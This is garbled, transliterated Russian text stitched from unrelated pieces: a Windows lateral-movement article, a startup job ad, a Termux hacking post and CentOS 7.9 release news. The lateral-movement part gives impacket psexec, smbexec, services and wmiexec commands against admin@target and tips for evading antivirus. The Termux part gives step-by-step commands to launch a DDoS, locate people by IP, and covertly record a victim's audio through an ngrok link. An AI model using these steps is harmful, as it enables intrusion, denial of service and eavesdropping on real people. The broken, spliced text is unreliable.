bokovo go pereme shcheniia, o kotorykh poi det rech' dal' she. Udalennoe vypolnenie koda v WindowsRas smot rim nes kol' ko spo sobov uda len nogo ispolne niia koda v Windows s pomoshch'iu uchet noi zapisi. Nekoto rye sreds tva pre dos tavlia iut udob nyi inte rak tivnyi rezhim, a nekoto rye -- tol' ko sle poi zapusk komand bez poluche niia rezul' tata. Nach nem obzor s samykh udob nykh i shiroko ras prostra nen nykh ins tru men tov i pos tepen no perei dem k menee populiar nym, no vse zhe spo sob nym ispolnit' kod.Chast' ins tru men tov zag ruzha et na target ispolnia emyi fail sluzh by, pyta ias' obes pechit' nam udob nyi inte rak tivnyi rezhim. No tut kro etsia opas nost': takie ser visy zachas tuiu budut zab lokiro vany anti viru som. Plius k eto mu IP ata kuiushche go mozhet byt' zab lokiro van, chto zator mozit pereme shchenie. I SOC uzna et o tom, chto v set' kto-to pro nik.Bol' shuiu chast' bokovo go pereme shcheniia my budem vypol niat' s pomoshch'iu zamecha tel' nogo Python-paketa impacket. Dlia ego usta nov ki tre buet sia vypol nit' koman du pip install impacket. Pos le usta nov ki neob khodimye ispolnia emye fai ly budut nakhodit' sia v pap ke impacket/examples, ras polozhe nie kotoroi pod ska zhet koman da pip show -f impacket. MSRPCEto reali zatsiia DCERPC ot Microsoft. Po suti, ras shiria et otkry tyi DCERPC pri pomoshchi dos tupa cherez ime novan nye pai py s ispol' zovani em pro toko la SMB. Glav nym obra zom ispol' zuet 445-i TCP-port. Perechis lit' dos tupnye pai py po slo variu na SMB pomozhet modul' auxiliary/scanner/smb/pipe_auditor.psexec.exePro iskhozhde nie: sysinternalsAV-risk: otsuts tvu etIs pol' zuemye por ty: 135, 445, 4915x/TCPNa chinaia govorit' ob uda len nom ispolne nii koda v Windows, nel' zia ne upo mianut' nebezyz ves tnyi psexec ot Mar ka Rus sinovi cha. Dan naia prog ramma pol' zuet sia odi nako voi populiar nost'iu i u admi nis tra torov, i u pen teste rov. Prin tsip ee raboty zak liucha etsia v kopiro vanii ispolnia emo go fai la cherez setevoi resurs <<ADMIN$>> (445/TCP) s pos ledu iushchim uda len nym soz dani em i zapus kom sluzh by dlia eto go ispolnia emo go fai la cherez DCERPC (135,4915x/TCP). Pos le zapus ka sluzh by pro iskho dit obych noe setevoe vza imo dei stvie s uda len noi koman dnoi stro koi:Glav nyi plius dlia nas v tom, chto ser vernyi kom ponent psexecsvc.exe pod pisan ser tifika tom Sysinternals (kotoryi pri nad lezhit Microsoft) i, sle dova tel' no, stop rotsen tno legitim naia prog ramma. Tak zhe k iavnym dos toins tvam klas siches kogo psexec.exe otno sit sia spo sob nost' vypol niat' kod v uka zan nykh pol' zovatel' skikh sean sakh:psexec.pyPro iskhozhde nie: Python-paket impacketAV-risk: est'Is pol' zuemye por ty: 445/TCPOt lichnaia al' ter nativa dlia pol' zovate lei Linux. Odna ko etot ins tru ment poch ti naver niaka pod nimet anti virus nuiu tre vogu. Kak bylo ska zano, vse delo v sluzh be, kotoraia kopiru etsia na uda len nyi khost. Eto mozh no ispra vit', uka zav v reali zatsii metoda createService() v /usr/local/lib/python3.7/dist-packages/impacket/examples/serviceinstall.py pro izvol' nuiu koman du, kotoraia budet vypol nena vmes to zapus kaemoi sluzh by uda len nogo admi nis tri rova niia.S pomoshch'iu pro izvol' noi koman dy mozh no skryt' zapusk sluzh by uda len nogo admi nis tri rova niiaChto by psexec.py ne sko piro val palev nyi kom ponent, uka zyva em pri nudi tel' no, kakoi fail ispol' zovat' v kaches tve sluzh by. I, pos kol' ku my uzhe vruch nuiu pro pisa li koman du, etim fai lom mozhet byt' chto ugod no:psexec.py-filesomefile.txtadmin@targetTa kim obra zom, my nap riamuiu vypol nili koman du mkdir c:pwn, chto, konech no zhe, ne vyzovet reak tsii so sto rony anti viru sov. Odna ko podob naia modifi katsiia psexec lisha et nas togo udobs tva ispol' zovaniia, kotoroe bylo izna chal' no.winexePro iskhozhde nie: paket winexeAV-risk: est'Is pol' zuemye por ty: 445/TCPBo lee sta ryi nativ nyi ana log psexec pod Linux. Kak i psexec, otkry vaet uda len nuiu inte rak tivnuiu koman dnuiu stro ku:winexe-Uadmin//targetcmdV tselom on pol nost'iu iden tichen dru gim podob nym ins tru men tam, odna ko rezhe obna ruzhi vaet sia anti viru sami. No vse zhe nel' zia ska zat', chto winexe na sto pro tsen tov bezopa sen. Tem ne menee ego mozh no ispol' zovat' dlia pods tra khov ki na slu chai, esli psexec.py vdrug ne sra bota et.smbexec.pyPro iskhozhde nie: Python-paket impacket / vstro ennyi kom ponent WindowsAV-risk: est'Is pol' zuemye por ty: 445/TCPUp roshchen nyi vari ant psexec, tak zhe soz daiushchii sluzh bu, tol' ko ispol' zuet sia pri etom iskliu chitel' no MSRPC, a dos tup k upravle niiu sluzh bami ustro en cherez SMB-paip svcctl:smbexec.py-modeSHAREadmin@targetV rezul' tate budet otkryt dos tup k inte rak tivnoi koman dnoi stro ke.services.pyPro iskhozhde nie: Python-paket impacketAV-risk: otsuts tvu etIs pol' zuemye por ty: 445/TCPEshche bolee upro shchen nyi vari ant psexec. Tut pred polaga etsia, chto my sami ruch kami dela em to, chto dela et za nas psexec. S pomoshch'iu services.py my mozhem pos motret' spi sok sluzhb:services.pyadmin@targetlistSoz dat' novuiu sluzh bu, uka zav pro izvol' nuiu koman du:services.pyadmin@targetcreate-name1-display1-path'cmd arg1 arg2'Za pus tit' tol' ko chto soz dannuiu sluzh bu:services.pyadmin@targetstart-name1Za mes ti sle dy i uda lit' ee:services.pyadmin@targetdelete-name1Vse eto daet nam eshche odin spo sob sle pogo nein terak tivno go ispolne niia komand, to est' bez rezul' tata. Zato eto na sto pro tsen tov bezopas nyi spo sob, i on ne raz vyruchal menia, kog da anti viru sy na uda len nom khos te ubi vali ves' levyi soft.atexec.py/at.exePro iskhozhde nie: Python-paket impacket / vstro ennyi kom ponent WindowsAV-risk: otsuts tvu etIs pol' zuemye por ty: 445/TCPSluzh ba pla nirov shchika zadanii Windows, dos tupnaia cherez smb-paip atsvc. Poz volia et uda len no pomes tit' v pla nirov shchik zadachu, kotoraia vypol nitsia v uka zan nyi moment.V obo ikh slu chaiakh eto ne inte rak tivnoe sreds tvo uda len nogo ispolne niia koda. Pri ispol' zovanii at.exe pro iskho dit sle poe ispolne nie komand:A vot dlia atexec.py koman da vypol nitsia s rezul' tatom:atexec.pyadmin@targetipconfigVsia raz nitsa v tom, chto rezul' tat vypol neniia koman dy budet nap ravlen v fail i pro chitan cherez setevoi resurs ADMIN$. Dlia svo ei raboty ins tru ment tre buet, chto by chasy u attacker i target byli nas tro eny na odno vre mia s toch nost'iu do minuty.reg.exePro iskhozhde nie: kom ponent WindowsAV-risk: otsuts tvu etIs pol' zuemye por ty: 445/TCPUda len nyi dos tup k rees tru s pra vami na zapis' na samom dele nam daet RCE. Dlia svo ei raboty ins tru ment tre buet SMB-paip winreg. Po umol chaniiu sluzh ba uda len nogo rees tra zapushche na tol' ko na ser vernykh OS Windows 2003-2019. A vot izves tnyi triuk s avto zag ruzkoi (otlo zhen noe RCE):Zdes' ispol' zuet sia obra bot chik zapus ka prog rammy. Esli prog ramma zapus kaet sia na PK chas to, to poluchim poch ti mgno ven noe RCE:Moi liubimyi triuk s bek dorom v RDP: DCERPCIs pol' zuet por ty 135/TCP i 4915x/TCP, gde 4915x -- dinami ches ki naz nacha emye por ty. Inog da mogut ispol' zovat' sia por ty iz dru gogo diapa zona.Ochen' chas to setevye admi nis tra tory i bezopas niki, kotorye v kur se naibo lee ras prostra nen nykh vek torov atak, v kaches tve mitigation pros to blo kiru iut port 445/TCP. Tem samym oni dela iut nep rigod nym ispol' zovanie psexec i mno gikh dru gikh spo sobov, opi san nykh vyshe. Odna ko, kak bylo ska zano ranee, Windows ime et mno zhes tvo spo sobov uda len nogo ispolne niia koda, i DCERPC pre dos tavlia et nam takuiu al' ter nativ nuiu voz mozhnost', v nekoto rykh slu chaiakh otkry vaia dos tup k tem zhe RPC-interfei sam. Po suti, my budem ispol' zovat' ne sam DCERPC, a to, chto rabota et po ego tekh nologii, nap rimer WMI.wmiexec.pyPro iskhozhde nie: Python-paket impacketAV-risk: est'Is pol' zuemye por ty: 135, (445), 4915x/TCPSkript wmiexec.py daet voz mozhnost' vypol nit' kod v inte rak tivnom rezhime:wmiexec.pyadmin@targetOd nako bylo zameche no, chto khot' wmiexec.py i ne zapus kaet na uda len noi sto rone nikakikh sto ron nikh ispolnia emykh fai lov, anti viru sy ego inog da loviat. Kro me togo, wmiexec.py polezet za rezul' tatom na sharu ADMIN$, chem zadei stvu et port 445/TCP. Bolee bezopas nym vari antom budet sle poe RCE:

Nash proekt Friday razvivaetsia -- akseleratory, novye B2B klienty, investitsii, interesnye fichi. Aktivno ishchem:     Software Engineer (dve pozitsii, vozmozhen part-taim)   B2B Sales i B2B Sales Lead      Customer Success Manager  Nespeshno ishchem s pritselom na 2-3 mesiatsa   -Community Manager -Account Manager -Marketing Lead -Product Manager    Chto delaet Friday?  * Pomogaet HR'am uskoriat' onbording i prokachivat' vnutrikorporativnyi netvorking * Pomogaet lideram soobshchestv rastit' v nikh gorizontal'nye sviazi * Pol'zovateli nakhodiat v nashikh botakh dlia Slack/Microsoft Teams/Telegram edinomyshlennikov, ekspertov i kolleg iz raznykh industrii * Dlia tekh, kto liubit formulirovki "uber for x", Friday -- eto "professional'nyi tinder", "privatnyi lunchclub" ili "random-kofe na steroidakh" (korotkoe demo https://t.me/MakeYourFridayBot)    Zachem my etim zanimaemsia?  Obshchenie -- draiver razvitiia, biznesa i kar'ery: nashei "biologicheskoi proshivke" neobkhodim kontakt s temi, komu mozhno doveriat'. Garvardskoe longitiudnoe issledovanie, idushchee uzhe bolee 80 let, pokazalo, chto blizkie otnosheniia s liud'mi vliiaiut na prodolzhitel'nost' zhizni i schast'e sil'nee, chem polozhenie v obshchestve, intellekt i geny. My provodim tret' vremeni zhizni na rabote, no do 40% sotrudnikov soobshchaiut o chuvstve izolirovannosti ot kolleg -- nuzhno pomeniat' etu vozmutitel'nuiu situatsiiu. Vprochem, nachinaem my s kompanii, kotorye uzhe aktivno zabotiatsia o svoikh liudiakh      Kto klienty?  Iandeks.Praktikum, MTS, VTB, UploadCare, 2GIS, SEMrush, izdatel'stvo MIF, Matemarketing, MarHR, GoGlobalWorld, Citymate, Fiztekh-Soiuz, FriendWork, Vysshaia shkola menedzhmenta SPbGU, ELK Academy, yCamp i desiatki drugikh potriasaiushchikh kompanii/soobshchestv (stat'ia v Rusbase https://rb.ru/list/business-tinder). Nekotorye klienty snachala razrabotali podobnye resheniia sami, no v itoge reshili rabotat' s Friday, oprobovav nashi algoritmy metchinga i vovlekaiushchie stsenarii      Kakie usloviia?  Prozrachnye tseli i protsessy, remote-first (no mozhno khodit' v ofis), stremitel'nyi rost po mere razvitiia kompanii, abstraktnye i ne ochen' memy v chatakh, draivovyi kollektiv s tsennostiami i missiei, topovye vneshnie mentory, optsion na fulltaime. A eshchio my ispol'zuem Friday, eto novyi klassnyi instrument dlia obmena luchshimi praktikami i sblizheniia s kollegami      Kakoi opyt u komandy?  V chisle predydushchikh rabotodatelei -- VK, Intel, Iandeks, DataArt, KROK, SEMrush, Oracle, Skyeng. Gluboko ponimaem potrebnosti HR'ov, topov i spetsialistov. V 2017-2019 osnovateli postroili produkt s pokhozhimi mekhanikami v B2C -- druzheskii deiting dlia samorazvitiia FriendZone, kotoryi prodolzhaet razvivat'sia parallel'no (stat'ia v Vedomostiakh https://www.vedomosti.ru/business/articles/2018/10/05/782850-kak-bot-prines-millioni)  Investor Friday -- Andrei Breslav, odin iz sozdatelei iazyka programmirovaniia Kotlin i soosnovatel' servisa dlia poiska psikhologa psyalter.ru  Itak, srochnye pozitsii:    B2B Sales i B2B Sales Lead  Ozhidaem razumnost', samokhodnost' i umenie stroit' dolgosrochnye otnosheniia, obshirnuiu set' kontaktov i opyt v HR / HR tech / SaaS / EdTech; zhelatel'no -- upravlencheskie ambitsii i razgovornyi angliiskii.   Predstoit aktivno privlekat' krupnye/rastushchie kompanii, dorabotat' skoring i sistemu prodazh, tochechno stavit' marketing-zadachi kollegam i podriadchikam. V ideale -- postroit' moshchnyi otdel i lidirovat' vykhod na mezhdunarodnye rynki v 2021 godu. No ne budem vozrazhat', esli ty reshish' prodolzhit' khorosho zarabatyvat' s rossiiskimi klientami        Software Engineer (dve pozitsii)  Ozhidaem razumnost' i azart. S nas smysl v rabote, poniatnyi fokus, kollegi s razvitymi soft-skillami, blagodarnye pol'zovateli i nikakikh soveshchanii radi soveshchanii. Kod pokryvaem testami, deploim v Kubernetes. Svezhaishii stek: Python3, Django3.1, Angular9.   Est' vakansii v oboikh proektakh "kholdinga FrFr" -- Friday i FriendZone. Vozmozhen part-taim             Customer Success Manager  Ozhidaem razumnost' i empatiiu, otlichnoe vladenie pis'mennoi rech'iu, interes k vnutrennim kommunikatsiiam, soobshchestvam i netvorkingu. A takzhe umenie ne tol'ko tushit' pozhary, no i produmyvat' resheniia dlia ikh predotvrashcheniia. Zhelatel'no -- opyt v menedzhmente i vedenii bazy znanii      Nespeshnyi poisk  Community Manager, Account Manager, Marketing Lead, Product Manager    Planiruem naim cherez neskol'ko mesiatsev, no budem rady poznakomit'sia zaranee. Est' zadachi na part-taim -- uspeem srabotat'sia.   Esli ty ne ishchesh' rabotu priamo seichas, no chuvstvuesh' interes i tsennostnyi metch, to davai znakomit'sia. Osobenno esli est' opyt v HR ili v rabote s HR.   --- Etot zhe tekst o kompanii, missii/tsennostiakh i vakansiiakh: https://www.facebook.com/kalupin/posts/3473816702654327  Etot zhe tekst v Notion: https://www.notion.so/awarehouse/Friday-38a70a3f637041489b71e1b494c76c77   Budem rady soobshcheniiam ot vas ili vashikh krutykh druzei tut t.me/awarehouse i v fb

Privet, moi malen'kie terroristy. V etoi stat'e budet top poleznykh komand dlia Termux. (POST SDELAN V OZNAKOMITEL'NYKh TsELIaKh, I NE PRIZYVAET K DEISTVIIu!!!) Chto takoe Termux? Eto tipa Lunix na android, no esli zhe ty sovsem tupoi, to eto komandnaia stroka dlia prochikh detskikh pakostei. Skachat' mozhno termos v plei markete. Nu blia, pristupim.  1) DDoS ataka na sait s telefona. Chto takoe ddos ataka vy naverno znaete (esli vy v tanke, to vbeite v gugl) Propisyvaem komandy v konsol':  pkg update pkg install git python cd git clone https://github.com/Andrey-oss/ddoser cd ddoser pip3 install requests termcolor colorama python3 ddos.py  Dalee tupo pishem adres saita. V znachenii dalee pishem 9999999999999. Gotovo!  2)Probiv cheloveka po ip cherez tot zhe samyi termos. Sperva pishem nashe znachenie apt update Potom pishem git clone https://github.com/maldevel/IPGeoLocation Otkryvaem direktoriiu: cd IPGeoLocation Dobavliaem razreshenie failu: chmod +x * Ustanavlivaem trebovaniia: pip install -r requirements.txt Zapuskaem programmu: python ipgeolocation.py -t [IP adres] Posle vvoda IP my poluchaem sleduiushchuiu informatsiiu: gorod, strana, shirotu - dolgotu,  provaider interneta, pochtovyi indeks i mnogoe drugoe.   3)Proslushka nashikh druzei. Dlia raboty dannogo sposoba vkliuchite rezhim modema. Ustanovka: pkg upgrade pkg upgrade pkg install git pkg install php git clone https://github.com/thelinuxchoice/sayhello git clone https://github.com/Marcel0Sousa/termux-ngrok cd termux-ngrok ./termux-ngrok.sh (posle etogo pishite Y) cd cd .. cd usr cd bin cp ngrok /data/data/com.termux/files/home/sayhello/ cd sayhello chmod +x sayhello.sh ./sayhello.sh Posle togo, kak vse sdelano, otkroetsia SayHello. Vybiraem v nei ngrok 2. Kopiruem ssylku i kidaem ee zhertve. Kogda zhertva razreshit, to v Termux budut pisat'sia Audio file received, esli vam dostatochno i bol'she zapisyvat' ne nuzhno, to vy nazhimaete Ctrl + c Dlia togo, chtoby perenesti vo vnutrenniuiu pamiat' audio napishite: termux-setup-storage cp (nazvanie audio faila, posmotret' nazvanie mozhno napisav ls) /storage/emulated/0/ Posle etogo sokhraniatsia audio faily v formate .waw, a naiti ikh mozhno, chtoby proslushat' v provodnike vo vnutrennei pamiati. Esli u vas ruki ne iz zhopy, i vy ne onimechnik, to u vas vse poluchitsia)))

Vypusk distributiva CentOS 7.9  Vypusk vobral v sebia izmeneniia iz Red Hat Enterprise Linux 7.9. Distributiv polnost'iu binarno sovmestim s RHEL 7.9.    Sborki CentOS 7.9 dostupny dlia arkhitektur x86_64, Aarch64 (ARM64), i386, ARMv7 (armhfp), ppc64, ppc64le i Power9. Dlia arkhitektury x86_64 podgotovleny ustanovochnye DVD-sborki (4.7 GB), obraz NetInstall dlia ustanovki po seti (590 MB), minimal'naia servernaia sborka (1 GB), polnyi obraz dlia USB Flash (11 GB) i Live-sborki s GNOME (1.5 GB) i KDE (2 GB). Pakety SRPMS, na osnove kotorykh proizvedena sborka binarnykh failov, i debuginfo dostupny cherez vault. centos. org.    Osnovnye izmeneniia v CentOS 7.9:    -- V sostav vkliucheny pakety s Python 3, pri ustanovke paketa python3 predlagaetsia Python 3.6.  -- Obnovleny versii SSSD 1.16.5, pacemaker 1.1.23 i MariaDB 5.5.68.  -- Izmeneno soderzhimoe 37 paketov, sredi kotorykh: yum, PackageKit, ntp, httpd, dhcp, firefox, glusterfs, grub2, anaconda.  -- Udaleny spetsifichnye dlia RHEL pakety, takie kak redhat-*, insights-client i subscription-manager-migration-data;

Sostoialsia vypusk distributiva CentOS 7.9 (2009), vobravshii v sebia izmeneniia iz Red Hat Enterprise Linux 7.9. Distributiv polnost'iu binarno sovmestim s RHEL 7.9 (vnesennye v pakety izmeneniia, kak pravilo, svodiatsia k rebrendingu i zamene khudozhestvennogo oformleniia).
